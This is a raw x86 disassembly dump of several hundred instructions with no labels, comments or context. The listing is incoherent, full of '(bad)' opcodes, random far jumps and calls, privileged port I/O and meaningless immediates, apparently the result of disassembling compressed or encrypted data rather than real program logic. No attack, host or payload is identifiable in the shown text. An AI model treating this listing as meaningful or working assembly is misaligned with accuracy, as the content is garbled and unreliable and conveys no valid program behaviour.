  41af8d:	test   BYTE PTR [esi-0x49da7ae9],cl
  41af93:	cwde   
  41af94:	sub    ah,ah
  41af96:	pop    ebx
  41af97:	(bad)  
  41af98:	cdq    
  41af99:	test   BYTE PTR [ecx-0x19d38591],bh
  41af9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afa0:	push   ecx
  41afa1:	sub    BYTE PTR [ecx+0x5],bl
  41afa4:	push   ss
  41afa5:	in     al,dx
  41afa6:	sub    ch,BYTE PTR [ebp+0x13594768]
  41afac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afad:	arpl   WORD PTR [ebp+0x6653341],bp
  41afb3:	inc    ebp
  41afb4:	(bad)  
  41afb5:	cmp    esi,ecx
  41afb7:	xchg   BYTE PTR [esi-0x10],al
  41afba:	clc    
  41afbb:	pop    ecx
  41afbc:	pop    ds
  41afbd:	and    ch,BYTE PTR [ebx-0x22]
  41afc0:	xchg   edi,eax
  41afc1:	adc    eax,0x6163823c
  41afc6:	dec    esp
  41afc7:	clc    
  41afc8:	mov    ebp,0x958981ea
  41afcd:	or     al,BYTE PTR [edx-0x5b]
  41afd0:	mov    ch,0x75
  41afd2:	push   0x55
  41afd4:	xor    ecx,ebx
  41afd6:	js     0x41afe4
  41afd8:	dec    ecx
  41afd9:	jne    0x41b050
  41afdb:	jecxz  0x41b034
  41afdd:	icebp  
  41afde:	jmp    0x6259:0x8a3c101d
  41afe5:	shl    ah,0x83
  41afe8:	int3   
  41afe9:	sbb    bl,BYTE PTR [ebp+ecx*1-0x4041f05e]
  41aff0:	sub    BYTE PTR [edx-0x217995e2],ch
  41aff6:	clc    
  41aff7:	xlat   BYTE PTR ds:[ebx]
  41aff8:	mov    ebx,0x89f2d15a
  41affd:	je     0x41b03e
  41afff:	push   edi
  41b000:	jbe    0x41b05a
  41b002:	and    edi,esi
  41b004:	xchg   ebp,eax
  41b005:	and    DWORD PTR [ecx+0xa25f69a],0x609bf973
  41b00f:	dec    ebp
  41b010:	(bad)  
  41b011:	push   ecx
  41b012:	add    edi,DWORD PTR [ebx+0x38]
  41b015:	or     ebp,DWORD PTR [ebx+0x2a7e0dd8]
  41b01b:	lahf   
  41b01c:	loope  0x41afbd
  41b01e:	jmp    0x41b055
  41b020:	(bad)  
  41b021:	retf   0x64ed
  41b024:	push   0x4f
  41b026:	ror    DWORD PTR [ecx+0x59],0x74
  41b02a:	inc    esp
  41b02b:	push   esi
  41b02c:	push   esp
  41b02d:	xor    DWORD PTR [ebx-0x235e0aca],ecx
  41b033:	push   edi
  41b034:	rcr    edi,cl
  41b036:	push   0x3
  41b038:	cmp    DWORD PTR [ebp-0x18704ce4],ebp
  41b03e:	dec    edi
  41b03f:	pop    edi
  41b040:	and    DWORD PTR [ebp+0x23],eax
  41b043:	pop    eax
  41b044:	lds    edx,FWORD PTR [ebp-0x4ed43a3d]
  41b04a:	mov    dl,bh
  41b04c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b04d:	adc    al,0x57
  41b04f:	mov    esi,0xb99a94b8
  41b054:	lahf   
  41b055:	icebp  
  41b056:	scas   eax,DWORD PTR es:[edi]
  41b057:	dec    eax
  41b058:	ret    0xb28b
  41b05b:	xlat   BYTE PTR ds:[ebx]
  41b05c:	enter  0x815e,0xf4
  41b060:	call   0xf20fbe68
  41b065:	and    eax,0xe6ffcea2
  41b06a:	aas    
  41b06b:	rol    bl,cl
  41b06d:	sub    BYTE PTR [ecx+esi*2-0x30],0xb7
  41b072:	test   al,0x70
  41b074:	jno    0x41b01e
  41b076:	xor    eax,0xfb4872bd
  41b07b:	adc    ch,BYTE PTR [ecx]
  41b07d:	and    esi,ebp
  41b07f:	repz or edi,esp
  41b082:	into   
  41b083:	xor    al,0x9e
  41b085:	jne    0x41b00e
  41b087:	add    ecx,DWORD PTR ds:0x23e13488
  41b08d:	test   al,0xf3
  41b08f:	sub    BYTE PTR [ecx+ecx*8-0x6e],dh
  41b093:	xchg   edi,eax
  41b094:	fcomp  DWORD PTR [edi]
  41b096:	aam    0x16
  41b098:	push   0x5a60b2f
  41b09d:	cld    
  41b09e:	jl     0x41b092
  41b0a0:	lds    esp,FWORD PTR [esi+0x382f7dd]
  41b0a6:	dec    ebp
  41b0a7:	add    eax,DWORD PTR [esi-0xd]
  41b0aa:	test   BYTE PTR [eax-0x1],al
  41b0ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0ae:	xor    BYTE PTR [esi],bl
  41b0b0:	out    dx,eax
  41b0b1:	jno    0x41b06f
  41b0b3:	or     eax,0xc590e32
  41b0b8:	push   es
  41b0b9:	aaa    
  41b0ba:	or     edi,ecx
  41b0bc:	js     0x41b08e
  41b0be:	adc    DWORD PTR [edi],ecx
  41b0c0:	cld    
  41b0c1:	mov    ebx,0x7dfcd408
  41b0c6:	adc    edx,edx
  41b0c8:	test   al,0x6
  41b0ca:	lahf   
  41b0cb:	fisttp WORD PTR [ebx+0x3a]
  41b0ce:	loopne 0x41b099
  41b0d0:	fldcw  WORD PTR [esi]
  41b0d2:	sub    DWORD PTR [ebp+0x4f],ebx
  41b0d5:	mov    WORD PTR [esi],fs
  41b0d7:	lods   al,BYTE PTR ds:[esi]
  41b0d8:	push   ebx
  41b0d9:	and    esi,ebp
  41b0db:	sbb    eax,0x46f9227c
  41b0e0:	fdivr  st,st(3)
  41b0e2:	adc    BYTE PTR [ecx+0x4c8b09d5],al
  41b0e8:	cs loop 0x41b09e
  41b0eb:	ror    DWORD PTR [edx],1
  41b0ed:	jge    0x41b140
  41b0ef:	push   esp
  41b0f0:	mov    ch,0xca
  41b0f2:	adc    BYTE PTR [ebx],al
  41b0f4:	jmp    0x5783e9b6
  41b0f9:	mov    cl,0x92
  41b0fb:	imul   ecx,DWORD PTR [ecx],0xe3a3e475
  41b101:	mov    ebx,0x81af541f
  41b106:	xchg   esp,eax
  41b107:	xchg   ebp,eax
  41b108:	ret    
  41b109:	dec    ebp
  41b10a:	push   es
  41b10b:	out    dx,al
  41b10c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b10d:	addr16 cmp eax,0x1a2f7b03
  41b113:	add    al,0x39
  41b115:	pop    ebx
  41b116:	mov    ds:0xa41773ec,eax
  41b11b:	cdq    
  41b11c:	push   esp
  41b11d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b11e:	mov    al,ds:0x8b9ce5ef
  41b123:	pop    ebp
  41b124:	jns    0x41b142
  41b126:	sbb    DWORD PTR [ebx],esp
  41b128:	in     al,0x3b
  41b12a:	jne    0x41b0b3
  41b12c:	cwde   
  41b12d:	jge    0x41b13b
  41b12f:	pop    ebp
  41b130:	push   edi
  41b131:	mov    esp,DWORD PTR [edx]
  41b133:	js     0x41b0bf
  41b135:	mov    ds:0x9c3cfe90,al
  41b13a:	jns    0x41b10f
  41b13c:	fwait
  41b13d:	repnz dec esi
  41b13f:	dec    ebx
  41b140:	mov    dh,0xd8
  41b142:	imul   esi,DWORD PTR [eax-0x7e],0xffffff9f
  41b146:	fistp  WORD PTR [ecx-0x60]
  41b149:	jo     0x41b198
  41b14b:	pop    esi
  41b14c:	pop    eax
  41b14d:	add    BYTE PTR [eax-0x17fe2ed5],ah
  41b153:	jge    0x41b19b
  41b155:	mov    cl,dh
  41b157:	or     esp,DWORD PTR [eax]
  41b159:	ja     0x41b11c
  41b15b:	in     al,dx
  41b15c:	(bad)  
  41b15d:	cmp    WORD PTR [edi-0x497f3cc5],0x13a4
  41b166:	fwait
  41b167:	pop    ebx
  41b168:	or     eax,0xe55cb34e
  41b16d:	xlat   BYTE PTR ds:[ebx]
  41b16e:	push   ebp
  41b16f:	add    BYTE PTR [ebp-0x17],cl
  41b172:	jecxz  0x41b1da
  41b174:	(bad)  
  41b175:	ds jmp 0x4413f2eb
  41b17b:	mov    ds:0x823cb68d,al
  41b180:	adc    ch,0xbe
  41b183:	mov    DWORD PTR [ecx-0x682df95f],ebp
  41b189:	inc    ebp
  41b18a:	sub    eax,0x5d204d8b
  41b18f:	jbe    0x41b144
  41b191:	add    al,0x64
  41b193:	shl    BYTE PTR [bp+si],cl
  41b196:	pop    ecx
  41b197:	inc    esp
  41b198:	test   BYTE PTR [esi+0x69],dh
  41b19b:	hlt    
  41b19c:	test   DWORD PTR [ecx+0x2329dc1f],ecx
  41b1a2:	js     0x41b152
  41b1a4:	jp     0x41b1cb
  41b1a6:	push   edx
  41b1a7:	lods   al,BYTE PTR ds:[esi]
  41b1a8:	and    esp,ebp
  41b1aa:	imul   ebx,DWORD PTR [esi-0x77a91ccd],0x7d6170d4
  41b1b4:	dec    ecx
  41b1b5:	sub    al,0x22
  41b1b7:	repz xor BYTE PTR [ebx-0x1],dl
  41b1bb:	leave  
  41b1bc:	mov    cl,BYTE PTR [ecx-0x15]
  41b1bf:	repnz adc BYTE PTR [ecx+0x342b8731],dl
  41b1c6:	test   al,0x1c
  41b1c8:	sbb    eax,edx
  41b1ca:	mov    bh,0x2
  41b1cc:	dec    ecx
  41b1cd:	sub    DWORD PTR [ebx],edi
  41b1cf:	sub    eax,0xd0a66183
  41b1d4:	sbb    DWORD PTR [ecx-0x22],edx
  41b1d7:	push   ebp
  41b1d8:	pop    ss
  41b1d9:	inc    ebx
  41b1da:	sub    eax,DWORD PTR [ebp+esi*8-0x46]
  41b1de:	addr16 js 0x41b197
  41b1e1:	js     0x41b1bf
  41b1e3:	xchg   edi,eax
  41b1e4:	and    eax,0x785907b7
  41b1e9:	int3   
  41b1ea:	sti    
  41b1eb:	jmp    DWORD PTR [esi+0x482ee49b]
  41b1f1:	mov    esp,0xf1c102d
  41b1f6:	fdiv   QWORD PTR [ebx-0x4b]
  41b1f9:	adc    BYTE PTR [ebx+edx*2+0x7c4f9730],dl
  41b200:	icebp  
  41b201:	loope  0x41b1c0
  41b203:	inc    edx
  41b204:	int    0xe7
  41b206:	lahf   
  41b207:	adc    bl,ch
  41b209:	into   
  41b20a:	fs out dx,al
  41b20c:	dec    esp
  41b20d:	test   eax,0x454b190
  41b212:	popa   
  41b213:	mov    al,0xe6
  41b215:	push   es
  41b216:	enter  0xac0b,0x19
  41b21a:	sub    DWORD PTR ds:0x9f5dfa1f,0x80123a10
  41b224:	aas    
  41b225:	lock pop ebp
  41b227:	gs jl  0x41b27f
  41b22a:	mov    bh,0x58
  41b22c:	sub    DWORD PTR [ebx+0x48],eax
  41b22f:	fs xchg ecx,eax
  41b231:	les    ecx,FWORD PTR [ecx-0x57]
  41b234:	or     BYTE PTR [edi+0x75f670b9],ah
  41b23a:	xchg   dl,dh
  41b23c:	cmp    al,0x18
  41b23e:	int3   
  41b23f:	pop    ss
  41b240:	cmp    BYTE PTR [edi+0x4be2cd16],0xce
  41b247:	ja     0x41b2b9
  41b249:	jge    0x41b20e
  41b24b:	xchg   ebx,eax
  41b24c:	ss out 0x70,eax
  41b24f:	fmul   QWORD PTR ds:0xcf21d3aa
  41b255:	retf   0x8ad1
  41b258:	sbb    BYTE PTR [edx-0x47],ah
  41b25b:	aad    0x17
  41b25d:	es inc ecx
  41b25f:	outs   dx,BYTE PTR ds:[esi]
  41b260:	xchg   edx,eax
  41b261:	jb     0x41b1fb
  41b263:	push   es
  41b264:	loope  0x41b1eb
  41b266:	call   0x11b4dc16
  41b26b:	mov    al,0xa5
  41b26d:	sbb    al,0x69
  41b26f:	dec    esi
  41b270:	popa   
  41b271:	dec    eax
  41b272:	mov    esp,0x8d022585
  41b277:	inc    eax
  41b278:	test   DWORD PTR [ebx+0x5e5700e5],ebx
  41b27e:	and    eax,0x14f1194d
  41b283:	ret    
  41b284:	test   DWORD PTR [ebx+0x788bacbb],ebp
  41b28a:	mov    ebx,0xa1bdf934
  41b28f:	test   BYTE PTR [ebx+0x21996f08],0xc8
  41b296:	mov    ds,WORD PTR [esi-0x287986be]
  41b29c:	enter  0xff7,0x78
  41b2a0:	out    0x9,eax
  41b2a2:	call   0x124c:0x3386a42f
  41b2a9:	or     ah,dl
  41b2ab:	and    al,0xf2
  41b2ad:	dec    ecx
  41b2ae:	or     eax,0x80fe8e02
  41b2b3:	sbb    eax,0xbfff0bc9
  41b2b8:	inc    edx
  41b2b9:	jl     0x41b2ae
  41b2bb:	rcl    BYTE PTR [ebx],cl
  41b2bd:	adc    BYTE PTR [edi+0x4d53223d],ch
  41b2c3:	mov    ebp,0x9c46240d
  41b2c8:	xchg   ebx,eax
  41b2c9:	mov    BYTE PTR ds:[ecx-0x73],cl
  41b2cd:	pop    ecx
  41b2ce:	inc    edi
  41b2cf:	jo     0x41b2fd
  41b2d1:	or     BYTE PTR [esi],dl
  41b2d3:	mov    edi,0x7a065753
  41b2d8:	hlt    
  41b2d9:	stos   BYTE PTR es:[edi],al
  41b2da:	out    dx,al
  41b2db:	cli    
  41b2dc:	pop    ebx
  41b2dd:	xchg   esp,eax
  41b2de:	imul   ebp
  41b2e0:	test   eax,0xf0130394
  41b2e5:	lods   al,BYTE PTR ds:[esi]
  41b2e6:	sbb    dl,BYTE PTR ds:0xe5a1f30e
  41b2ec:	dec    ebx
  41b2ed:	jmp    0x41b2a3
  41b2ef:	or     DWORD PTR [esi+0xd],0x292a84da
  41b2f6:	mov    ch,0x35
  41b2f8:	popf   
  41b2f9:	(bad)  
  41b2fa:	ficom  DWORD PTR [ebx+0x6eee8c0e]
  41b300:	sar    BYTE PTR [eax],1
  41b302:	xlat   BYTE PTR ds:[ebx]
  41b303:	loopne 0x41b369
  41b305:	ds jmp 0x4fece4b7
  41b30b:	xrelease mov BYTE PTR [ecx+eiz*2+0xa],bl
  41b310:	mov    ch,0xd6
  41b312:	int3   
  41b313:	in     al,dx
  41b314:	pusha  
  41b315:	mov    cl,0xec
  41b317:	xchg   ecx,eax
  41b318:	jmp    0x41b2f3
  41b31a:	xchg   edi,eax
  41b31b:	lds    eax,FWORD PTR [edx+ebx*4+0x11]
  41b31f:	fstp   QWORD PTR [edi+0x7ed1e615]
  41b325:	mov    ebp,0x147120c4
  41b32a:	mov    BYTE PTR [edi+0x75],cl
  41b32d:	xor    edx,DWORD PTR [eax]
  41b32f:	mov    eax,ds:0x220e422e
  41b334:	dec    edi
  41b335:	pusha  
  41b336:	mov    DWORD PTR [edi+0x10],0x6ab45d0
  41b33d:	sbb    ah,BYTE PTR [eax+0x2958e66c]
  41b343:	call   0x7edd:0x80598573
  41b34a:	(bad)  
  41b34c:	aad    0x37
  41b34e:	aam    0x44
  41b350:	jecxz  0x41b33a
  41b352:	out    dx,eax
  41b353:	stc    
  41b354:	pop    es
  41b355:	jp     0x41b2f6
  41b357:	stos   BYTE PTR es:[edi],al
  41b358:	dec    edx
  41b359:	mov    esp,DWORD PTR [esi+ecx*4]
  41b35c:	fwait
  41b35d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b35e:	mov    dh,0xe1
  41b360:	inc    ebp
  41b361:	adc    bh,BYTE PTR [ebx+0x4564f1ac]
  41b367:	or     BYTE PTR [eax+esi*4-0x35],al
  41b36b:	int3   
  41b36c:	dec    esp
  41b36d:	popf   
  41b36e:	or     BYTE PTR ds:0xcfee64ab,0xf0
  41b375:	xchg   edi,eax
  41b376:	adc    edi,ebx
  41b378:	in     al,0xa9
  41b37a:	inc    eax
  41b37b:	sub    BYTE PTR [ebx-0xc],cl
  41b37e:	imul   ebx,DWORD PTR [eax-0x33],0x111ce9c8
  41b385:	test   ch,ch
  41b387:	cdq    
  41b388:	fs cmp eax,0xf8d28d13
  41b38e:	push   eax
  41b38f:	pop    ebx
  41b390:	jmp    0x28325768
  41b395:	push   esp
  41b396:	lahf   
  41b397:	cmc    
  41b398:	sar    BYTE PTR [bp+di],cl
  41b39b:	ins    BYTE PTR es:[edi],dx
  41b39c:	cld    
  41b39d:	push   ecx
  41b39e:	dec    edi
  41b39f:	(bad)  
  41b3a0:	xchg   edi,eax
  41b3a1:	xchg   ebx,eax
  41b3a2:	adc    BYTE PTR [esi],bh
  41b3a4:	push   ds
  41b3a5:	daa    
  41b3a6:	sub    eax,eax
  41b3a8:	out    0xc5,eax
  41b3aa:	adc    eax,DWORD PTR [edi-0x21]
  41b3ad:	sub    al,0x91
  41b3af:	sbb    edi,DWORD PTR [esi+0x51e0c467]
  41b3b5:	fs (bad) 
  41b3b9:	pusha  
  41b3ba:	bound  edi,QWORD PTR [ebx]
  41b3bc:	adc    cl,bl
  41b3be:	xchg   edi,eax
  41b3bf:	ficomp DWORD PTR [esi+edx*1]
  41b3c2:	dec    edx
  41b3c3:	xor    al,0x74
  41b3c5:	out    0x53,eax
  41b3c7:	sbb    eax,ebx
  41b3c9:	adc    ecx,DWORD PTR [edi+ecx*2-0x8]
  41b3cd:	mov    ds:0x28562491,al
  41b3d2:	aad    0xbe
  41b3d4:	xlat   BYTE PTR ds:[ebx]
  41b3d5:	sahf   
  41b3d6:	(bad)  
  41b3d7:	out    dx,eax
  41b3d8:	stos   DWORD PTR es:[edi],eax
  41b3d9:	pop    esp
  41b3da:	push   0xffaa936d
  41b3df:	adc    edx,ebx
  41b3e1:	jb     0x41b381
  41b3e3:	out    dx,al
  41b3e4:	lock outs dx,BYTE PTR ds:[esi]
  41b3e6:	add    dh,bl
  41b3e8:	inc    edx
  41b3e9:	mov    ah,0x3f
  41b3eb:	mov    edx,0xbc6e335b
  41b3f0:	dec    ebx
  41b3f1:	test   al,0xd5
  41b3f3:	pop    ecx
  41b3f4:	inc    ebp
  41b3f5:	xchg   ecx,eax
  41b3f6:	xchg   ecx,eax
  41b3f7:	mov    al,ds:0xc16a9112
  41b3fc:	xchg   dl,ah
  41b3fe:	out    dx,eax
  41b3ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b400:	jb     0x41b3cb
  41b402:	jb     0x41b3af
  41b404:	xchg   ecx,eax
  41b405:	je     0x41b3ae
  41b407:	stc    
  41b408:	mov    eax,esi
  41b40a:	add    al,0x87
  41b40c:	inc    ebp
  41b40d:	fiadd  DWORD PTR [ebx+0x68570a89]
  41b413:	cmp    DWORD PTR [ecx],ecx
  41b415:	xchg   edx,eax
  41b416:	jp     0x41b40a
  41b418:	sbb    BYTE PTR [edi-0x3a],dh
  41b41b:	in     eax,0x7e
  41b41d:	jae    0x41b456
  41b41f:	in     al,dx
  41b420:	push   0x6ab25cdb
  41b425:	add    dh,BYTE PTR [edx-0x11]
  41b428:	xor    ecx,0xffffffcf
  41b42b:	pop    es
  41b42c:	pop    esp
  41b42d:	push   ds
  41b42e:	push   ebx
  41b42f:	or     eax,0x91811c78
  41b434:	addr16 dec esi
  41b436:	xchg   DWORD PTR [edx+0x6988989a],esi
  41b43c:	jecxz  0x41b430
  41b43e:	sbb    BYTE PTR [ebx],dh
  41b440:	test   DWORD PTR [edi-0xd],edx
  41b443:	daa    
  41b444:	cwde   
  41b445:	aaa    
  41b446:	cmp    ebx,eax
  41b448:	and    al,0xa2
  41b44a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b44c:	outs   dx,DWORD PTR ds:[esi]
  41b44d:	mov    ds:0x4fda2e08,eax
  41b452:	jno    0x41b3f9
  41b454:	or     DWORD PTR [edx-0x2646ca4a],esp
  41b45a:	aad    0x96
  41b45c:	ror    edx,0x9e
  41b45f:	sti    
  41b460:	(bad)  cs:[edi-0x43]
  41b464:	mov    esp,0x8d566b28
  41b469:	mov    eax,0x60fc8d8e
  41b46e:	lea    ebx,[esi+0x7664b55f]
  41b474:	(bad)  
  41b475:	fimul  WORD PTR [esi+0x8]
  41b478:	aaa    
  41b479:	adc    edi,esp
  41b47b:	inc    esp
  41b47c:	ror    BYTE PTR [edi],1
  41b47e:	lahf   
  41b47f:	fs push edx
  41b481:	dec    ecx
  41b482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b483:	icebp  
  41b484:	or     edi,edi
  41b486:	imul   edx,DWORD PTR [edx-0x15],0xffffffe8
  41b48a:	adc    bl,BYTE PTR [ebx-0x72]
  41b48d:	in     al,dx
  41b48e:	xchg   ebx,eax
  41b48f:	inc    ebx
  41b490:	stos   BYTE PTR es:[edi],al
  41b491:	cmc    
  41b492:	leave  
  41b493:	mov    eax,ds:0xca50ae4f
  41b498:	push   esp
  41b499:	inc    ecx
  41b49a:	outs   dx,BYTE PTR ds:[esi]
  41b49b:	sahf   
  41b49c:	push   eax
  41b49d:	pop    esi
  41b49e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b49f:	retf   0x1059
  41b4a2:	shr    DWORD PTR [esi-0x14],0x1a
  41b4a6:	add    ah,BYTE PTR [esi+0x133cde75]
  41b4ac:	loopne 0x41b459
  41b4ae:	sar    DWORD PTR [edi],1
  41b4b0:	pop    ss
  41b4b1:	repnz mov ebp,0x3e1281a8
  41b4b7:	enter  0x7dc1,0x27
  41b4bb:	inc    ebp
  41b4bc:	jae    0x41b4f0
  41b4be:	and    DWORD PTR [edi+0x42],0x26
  41b4c2:	xchg   DWORD PTR [ebp+0x15],ebp
  41b4c5:	fdiv   QWORD PTR [ebp+0x5f]
  41b4c8:	dec    ebp
  41b4c9:	(bad)  
  41b4ca:	div    BYTE PTR [edi+0x7d]
  41b4cd:	xchg   edi,eax
  41b4ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4cf:	or     eax,0x62164d64
  41b4d4:	cdq    
  41b4d5:	inc    BYTE PTR [ecx]
  41b4d7:	push   ebx
  41b4d8:	int3   
  41b4d9:	sub    eax,0x52cfda8a
  41b4de:	add    eax,0x81beef93
  41b4e3:	fcmovu st,st(2)
  41b4e5:	xor    ecx,DWORD PTR [esi-0x21]
  41b4e8:	hlt    
  41b4e9:	dec    ecx
  41b4ea:	cli    
  41b4eb:	loopne 0x41b4da
  41b4ed:	fsub   st(7),st
  41b4ef:	inc    esi
  41b4f0:	lea    eax,[eax]
  41b4f2:	les    esp,FWORD PTR [ecx+0x76]
  41b4f5:	hlt    
  41b4f6:	cmp    al,0x4f
  41b4f8:	adc    ah,BYTE PTR [edi-0x21]
  41b4fb:	xor    DWORD PTR fs:[esi+0x7f8add0c],esp
  41b502:	int    0x7c
  41b504:	xchg   BYTE PTR [ebx+0x72ecc369],cl
  41b50a:	cmp    DWORD PTR [eax-0x15b403d4],eax
  41b510:	or     al,0xb0
  41b512:	xchg   ecx,eax
  41b513:	sbb    BYTE PTR [esi],bh
  41b515:	mov    ah,0x2a
  41b517:	out    dx,al
  41b518:	int    0x9b
  41b51a:	lahf   
  41b51b:	call   0x6bb6efc6
  41b520:	dec    esi
  41b521:	xchg   esp,eax
  41b522:	imul   edx,DWORD PTR [esi],0x4
  41b525:	mov    cl,0x10
  41b527:	out    0xcd,eax
  41b529:	mov    al,ds:0xc6a0435e
  41b52e:	test   ebx,ecx
  41b530:	inc    edi
  41b531:	retf   0x4f5b
  41b534:	push   es
  41b535:	fbstp  TBYTE PTR [edi+eiz*4]
  41b538:	cli    
  41b539:	in     eax,0xeb
  41b53b:	mov    BYTE PTR ds:0x8de2ba68,ah
  41b541:	jb     0x41b5a5
  41b543:	jns    0x41b588
  41b545:	sbb    BYTE PTR [eax+0x6e],dh
  41b548:	(bad)  
  41b549:	push   es
  41b54a:	inc    eax
  41b54b:	rcl    BYTE PTR [edx-0x3d925b9b],1
  41b551:	and    BYTE PTR [edi+eax*2+0x1c1ee657],bh
  41b558:	scas   eax,DWORD PTR es:[edi]
  41b559:	call   0xcdb2:0x3dd75fee
  41b560:	or     BYTE PTR [ecx+0x4bf73e2f],bl
  41b566:	pop    eax
  41b567:	or     ah,BYTE PTR [ebx+0x57]
  41b56a:	xor    bl,BYTE PTR [edx+ebp*2-0x4e]
  41b56e:	mov    ecx,DWORD PTR [esi+0x372bfb33]
  41b574:	cmp    al,0x68
  41b576:	aaa    
  41b577:	shl    DWORD PTR [ebx+edx*2],cl
  41b57a:	pop    esp
  41b57b:	outs   dx,BYTE PTR ds:[esi]
  41b57c:	dec    esp
  41b57d:	inc    ebp
  41b57e:	dec    ebp
  41b57f:	fmul   st(4),st
  41b581:	and    eax,0x8700d94c
  41b586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b587:	adc    ch,al
  41b589:	pop    edx
  41b58a:	add    ch,ah
  41b58c:	cmp    eax,esi
  41b58e:	xchg   edx,eax
  41b58f:	fild   QWORD PTR [edx-0x13]
  41b592:	fld    TBYTE PTR [ebx-0x1aa5b9bd]
  41b598:	mov    eax,ds:0x671bd784
  41b59d:	mul    bh
  41b59f:	(bad)  
  41b5a0:	jg     0x41b5f0
  41b5a2:	rcl    DWORD PTR [edx+0x4],1
  41b5a5:	inc    esi
  41b5a6:	outs   dx,DWORD PTR ds:[esi]
  41b5a7:	push   eax
  41b5a8:	daa    
  41b5a9:	test   al,0x91
  41b5ab:	repnz clc 
  41b5ad:	xchg   ecx,eax
  41b5ae:	fs call 0xb74408ba
  41b5b4:	sbb    ebx,ebx
  41b5b6:	adc    BYTE PTR [edx],bh
  41b5b8:	and    ebx,ebp
  41b5ba:	js     0x41b58e
  41b5bc:	pop    es
  41b5bd:	bound  esi,QWORD PTR [edi+0x452a6655]
  41b5c3:	enter  0x976e,0xf0
  41b5c7:	inc    ecx
  41b5c8:	dec    ebp
  41b5c9:	adc    DWORD PTR [esi],esi
  41b5cb:	je     0x41b62a
  41b5cd:	sbb    esp,DWORD PTR [esi]
  41b5cf:	xlat   BYTE PTR ds:[ebx]
  41b5d0:	test   BYTE PTR [ecx+eax*8],dh
  41b5d3:	mov    dl,0xa2
  41b5d5:	xchg   ebp,eax
  41b5d6:	int    0x39
  41b5d8:	adc    dh,al
  41b5da:	xor    DWORD PTR [edi],edx
  41b5dc:	mov    esp,0x57854e2c
  41b5e1:	sbb    al,0x25
  41b5e3:	daa    
  41b5e4:	pop    ecx
  41b5e5:	rcl    BYTE PTR [edx-0xf],cl
  41b5e8:	cwde   
  41b5e9:	sbb    edi,DWORD PTR [edi+0x1d]
  41b5ec:	cmp    DWORD PTR [ecx+0x5051483b],esi
  41b5f2:	jmp    0x41b587
  41b5f4:	adc    eax,0xf7b2af1f
  41b5f9:	dec    eax
  41b5fa:	in     al,dx
  41b5fb:	mov    BYTE PTR [ebp-0x1088005c],al
  41b601:	aas    
  41b602:	dec    esi
  41b603:	dec    ebx
  41b604:	pop    edx
  41b605:	cmp    DWORD PTR fs:[eax-0x72f760e9],ebp
  41b60c:	pop    ds
  41b60d:	in     eax,dx
  41b60e:	cmp    ebx,esi
  41b610:	pop    ebx
  41b611:	fwait
  41b612:	push   esp
  41b613:	sub    edi,DWORD PTR [ebp-0x4c]
  41b616:	push   edx
  41b617:	adc    DWORD PTR [esi+0x72],0x78
  41b61b:	lods   eax,DWORD PTR ds:[esi]
  41b61c:	or     ah,0x4
  41b61f:	dec    ebx
  41b620:	gs fcomp st(3)
  41b623:	je     0x41b626
  41b625:	(bad)
  41b628:	aad    0xe
  41b62a:	icebp  
  41b62b:	test   al,0xd7
  41b62d:	dec    edi
  41b62e:	mov    esi,0x9c05fdef
  41b633:	dec    edi
  41b634:	cwde   
  41b635:	call   0xec70:0xb4b32950
  41b63c:	mov    dl,0x75
  41b63e:	dec    edi
  41b63f:	cmp    al,0x70
  41b641:	sbb    DWORD PTR [ebx-0x3ccd4c35],ebp
  41b647:	add    bl,BYTE PTR [ecx+edx*2]
  41b64a:	sub    bl,BYTE PTR [ebx-0x4b]
  41b64d:	pusha  
  41b64e:	pop    esi
  41b64f:	jnp    0x41b677
  41b651:	rol    DWORD PTR [edi+0x225d2780],1
  41b657:	jno    0x41b5f8
  41b659:	shl    al,cl
  41b65b:	es scas al,BYTE PTR es:[edi]
  41b65d:	or     eax,0xbf3d3acf
  41b662:	(bad)  
  41b663:	pop    edx
  41b664:	or     eax,0x9c2bb23e
  41b669:	das    
  41b66a:	or     eax,0x8e5a06ac
  41b66f:	push   ebx
  41b670:	and    al,0x88
  41b672:	and    al,0xe1
  41b674:	(bad)  
  41b675:	out    0x34,eax
  41b677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b678:	mov    eax,0x42d5b80
  41b67d:	mov    cl,BYTE PTR [esi-0x770c0d46]
  41b683:	pop    edx
  41b684:	sbb    eax,0xcf84707d
  41b689:	pop    eax
  41b68a:	add    BYTE PTR [eax+0x68eb502],0x91
  41b691:	jle    0x41b6e2
  41b693:	sub    eax,0x3f0eb053
  41b698:	add    al,0x1f
  41b69a:	pop    ss
  41b69b:	jg     0x41b6b1
  41b69d:	and    DWORD PTR [eax-0x71],esp
  41b6a0:	ror    DWORD PTR [ecx-0x36],cl
  41b6a3:	jae    0x41b6d9
  41b6a5:	cmp    eax,0x2848405c
  41b6aa:	(bad)
  41b6ad:	dec    esp
  41b6ae:	into   
  41b6af:	pop    esi
  41b6b0:	stos   DWORD PTR es:[edi],eax
  41b6b1:	aas    
  41b6b2:	test   BYTE PTR [ecx-0x7d],0xf5
  41b6b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6b7:	leave  
  41b6b8:	aas    
  41b6b9:	mov    ch,BYTE PTR [esp+ecx*1+0x62]
  41b6bd:	ret    
  41b6be:	shr    DWORD PTR [ebx],1
  41b6c0:	int    0xde
  41b6c2:	pop    ecx
  41b6c3:	dec    eax
  41b6c4:	imul   esp,DWORD PTR ds:0xf4813832,0xffffffdc
  41b6cb:	mov    cs,WORD PTR [esi]
  41b6cd:	fdivp  st(6),st
  41b6cf:	fistp  QWORD PTR [eax]
  41b6d1:	jle    0x41b6b0
  41b6d3:	push   edi
  41b6d4:	dec    ebp
  41b6d5:	jmp    0x763d:0xebe3a8ab
  41b6dc:	imul   esi,DWORD PTR [edx+0x22],0x982bdb29
